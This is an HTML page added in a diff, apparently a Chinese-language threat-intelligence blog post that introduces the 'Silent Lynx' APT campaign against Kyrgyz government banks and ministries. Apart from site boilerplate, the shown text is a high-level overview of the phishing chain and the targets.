@@ -1,0 +1,1080 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/dog2.jpg">
+  <link rel="icon" href="/img/dog2.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jentle">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介最近遥测发现一批东欧地区的样本，同时 Seqrite 实验室的高级持续威胁团队（APT-Team）最近披露了一个新威胁组织发起的两次新活动，将其命名为 “沉默山猫”（Silent Lynx）。该威胁组织此前曾针对东欧和中亚地区参与经济决策的政府智囊团以及银行业机构发动攻击。此次活动的目标指向中亚经济特别计划（SPECA）的参与国之一 —— 吉尔吉斯斯坦。在此次攻击中，威胁组织发送了以联合国相关">
+<meta property="og:type" content="article">
+<meta property="og:title" content="揭秘 “沉默山猫”（Silent Lynx）高级持续威胁组织：针对吉尔吉斯斯坦及周边国家的恶意攻击">
+<meta property="og:url" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="TIPFactory">
+<meta property="og:description" content="简介最近遥测发现一批东欧地区的样本，同时 Seqrite 实验室的高级持续威胁团队（APT-Team）最近披露了一个新威胁组织发起的两次新活动，将其命名为 “沉默山猫”（Silent Lynx）。该威胁组织此前曾针对东欧和中亚地区参与经济决策的政府智囊团以及银行业机构发动攻击。此次活动的目标指向中亚经济特别计划（SPECA）的参与国之一 —— 吉尔吉斯斯坦。在此次攻击中，威胁组织发送了以联合国相关">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/ac3c6447-9bfd-4d37-9ad3-1685ed081b01-20250122092744-mwjqawt.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/6dc56b26-e7ea-4cc1-a40a-ffeb4b89a66b-20250122093059-m8wjpl7.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122093322-r6wxrru.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105119-umhizqx.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105215-71evgop.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105240-lwvmt0y.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105248-5htdfs1.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105429-vvjjlrc.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105454-50hmzzq.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105518-tvyewwr.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105525-qk51s5j.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105531-9s5r6rk.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105800-o6g5cuc.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105815-csm17n2.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105820-fj0tt2w.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105825-09nv3qj.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105828-1eahtc2.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105904-ktwe9oh.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105913-vnsxp3c.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105940-m2wj05s.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105951-9j456kb.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110009-8tldd1q.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110021-elogymc.png">
+<meta property="og:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110027-t5ztuly.png">
+<meta property="article:published_time" content="2025-01-22T09:49:12.000Z">
+<meta property="article:modified_time" content="2025-01-22T13:05:38.702Z">
+<meta property="article:author" content="Jentle">
+<meta property="article:tag" content="APT">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/ac3c6447-9bfd-4d37-9ad3-1685ed081b01-20250122092744-mwjqawt.png">
+  
+  
+  
+  <title>揭秘 “沉默山猫”（Silent Lynx）高级持续威胁组织：针对吉尔吉斯斯坦及周边国家的恶意攻击 - TIPFactory</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="TIPFactory" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>TIPFactory</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="揭秘 “沉默山猫”（Silent Lynx）高级持续威胁组织：针对吉尔吉斯斯坦及周边国家的恶意攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-22 17:49" pubdate>
+          January 22, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          38 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">揭秘 “沉默山猫”（Silent Lynx）高级持续威胁组织：针对吉尔吉斯斯坦及周边国家的恶意攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><pre><code class="hljs">最近遥测发现一批东欧地区的样本，同时 Seqrite 实验室的高级持续威胁团队（APT-Team）最近披露了一个新威胁组织发起的两次新活动，将其命名为 “沉默山猫”（Silent Lynx）。该威胁组织此前曾针对东欧和中亚地区参与经济决策的政府智囊团以及银行业机构发动攻击。此次活动的目标指向中亚经济特别计划（SPECA）的参与国之一 —— 吉尔吉斯斯坦。在此次攻击中，威胁组织发送了以联合国相关主题为诱饵的恶意邮件，目标是吉尔吉斯共和国国家银行的政府机构；而第二次活动则将矛头指向了吉尔吉斯斯坦财政部。
+
+在本博客中，我们将深入探讨在分析过程中遇到的这些活动的技术细节。我们将研究此次攻击活动的各个阶段，感染始于一封带有 RAR 附件的网络钓鱼邮件，附件中包含一个恶意 ISO 文件、一个良性诱饵文档以及一个恶意 C++ 有效载荷。该有效载荷包含经过编码的嵌入式 PowerShell 脚本，可作为入侵受害者计算机的远程访问工具。在第二次活动中，网络钓鱼邮件附带了一个受密码保护的 RAR 文件，其中包含一个诱饵文档和一个恶意 Golang 植入程序。我们还将审视整个活动背后的基础设施。
+</code></pre>
+<h2 id="主要目标"><a href="#主要目标" class="headerlink" title="主要目标"></a>主要目标</h2><ul>
+<li>大使馆</li>
+<li>律师事务所</li>
+<li>政府银行</li>
+<li>政府智囊团</li>
+</ul>
+<h2 id="受影响的行业"><a href="#受影响的行业" class="headerlink" title="受影响的行业"></a>受影响的行业</h2><p>政府银行</p>
+<h2 id="地理重点区域"><a href="#地理重点区域" class="headerlink" title="地理重点区域"></a>地理重点区域</h2><p>吉尔吉斯斯坦、土库曼斯坦</p>
